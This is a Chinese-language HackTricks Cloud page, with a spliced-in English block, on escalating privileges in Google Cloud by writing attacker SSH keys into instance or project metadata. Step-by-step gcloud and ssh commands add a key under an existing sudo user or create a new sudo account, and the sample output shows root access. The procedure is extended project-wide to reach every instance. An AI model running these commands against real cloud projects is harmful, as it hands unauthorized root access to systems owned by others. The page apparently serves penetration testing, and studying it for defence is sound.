# GCP - 添加自定义SSH元数据

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 修改元数据 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

如果您可以**修改实例的元数据**，则有多种方法可以在本地提升特权。以下是可能导致具有此权限的服务帐户的几种情况：

_**默认服务帐户**_\
如果服务帐户访问**范围**设置为**完全访问**，或者至少明确允许**访问计算API**，则此配置容易受到提权攻击。**默认**的**范围**是**不容易受到攻击**的。

_**自定义服务帐户**_\
使用自定义服务帐户时，需要以下IAM权限之一才能提升特权：

* `compute.instances.setMetadata`（影响单个实例）
* `compute.projects.setCommonInstanceMetadata`（影响项目中的所有实例）

尽管Google [建议](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)不要为自定义服务帐户使用访问范围，但仍然可以这样做。您需要以下**访问范围**之一：

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **向自定义元数据添加SSH密钥**

在GCP上，**Linux**系统通常会运行[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)脚本。其中之一是[accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)，它会**定期查询**实例元数据端点以获取**授权的SSH公钥的更改**。

**如果遇到新的公钥**，它将被处理并**添加到本地机器**。根据密钥的格式，它将被添加到现有用户的`~/.ssh/authorized_keys`文件中，或者将创建一个具有`sudo`权限的新用户。

因此，如果您可以使用您的服务帐户修改自定义实例元数据，您可以通过获得特权帐户的SSH权限来在本地系统上提升为root。如果您可以修改**自定义项目元数据**，则可以在当前GCP项目中运行accounts daemon的**任何系统上提升**为root。

### **向现有特权用户添加SSH密钥**

让我们首先将我们自己的密钥添加到现有帐户中，因为这可能会产生最小的噪音。

**检查实例是否存在SSH密钥**。选择其中一个用户，因为他们很可能具有sudo权限。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
### Add Custom SSH Metadata

To escalate privileges in GCP Compute Engine instances, you can add custom SSH metadata to gain unauthorized access.

1. Identify the target instance by using the `gcloud` command:
   ```
   gcloud compute instances list
   ```

2. Retrieve the SSH key associated with the target instance:
   ```
   gcloud compute instances describe [INSTANCE_NAME] --format="get(metadata.items.ssh-keys)"
   ```

3. Create a new SSH key pair:
   ```
   ssh-keygen -t rsa -f [KEY_FILENAME]
   ```

4. Add the public key to the target instance's metadata:
   ```
   gcloud compute instances add-metadata [INSTANCE_NAME] --metadata="ssh-keys=[USERNAME]:$(cat [KEY_FILENAME].pub)"
   ```

5. SSH into the target instance using the new SSH key:
   ```
   ssh -i [KEY_FILENAME] [USERNAME]@[INSTANCE_IP]
   ```

By adding custom SSH metadata, you can gain unauthorized access to GCP Compute Engine instances and escalate your privileges.
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
请注意公钥的**略微奇怪的格式** - 用户名在**开头**（后跟冒号），然后再次出现在**结尾**。我们需要匹配这个格式。与正常的SSH密钥操作不同，用户名绝对重要！

将带有用户名和密钥的行保存在名为`meta.txt`的新文本文件中。

假设我们的目标是上面提到的用户`alice`。我们将像这样**生成一个新的密钥**：
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
将您的新公钥添加到文件`meta.txt`中，模仿以下格式：
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
现在，您可以使用以下命令**重新编写实例的SSH密钥元数据**：
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
您可以按照以下步骤**以`alice`的身份访问shell**：
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **创建一个新的特权用户并添加SSH密钥**

按照上述步骤后发现没有现有的密钥？在`/etc/passwd`中没有其他有趣的目标？

你可以**按照相同的过程**，只是**编造一个新的用户名**。这个用户将会被自动创建并被赋予`sudo`权限。脚本化的过程如下所示：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### 项目级别的SSH密钥 <a href="#sshing-around" id="sshing-around"></a>

根据前一节中提到的详细信息，您可以尝试入侵更多的虚拟机。

我们可以进一步扩展这些内容，通过[**在项目级别应用SSH密钥**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)，授予您对未明确选择“阻止项目级别SSH密钥”选项的任何实例进行SSH的权限，从而进入特权账户。
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
如果你非常大胆，你也可以直接输入`gcloud compute ssh [INSTANCE]`来使用你当前的用户名登录其他主机。

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果你想看到你的**公司在 HackTricks 中被宣传**，或者如果你想访问**PEASS 的最新版本或下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享你的黑客技巧。**

</details>
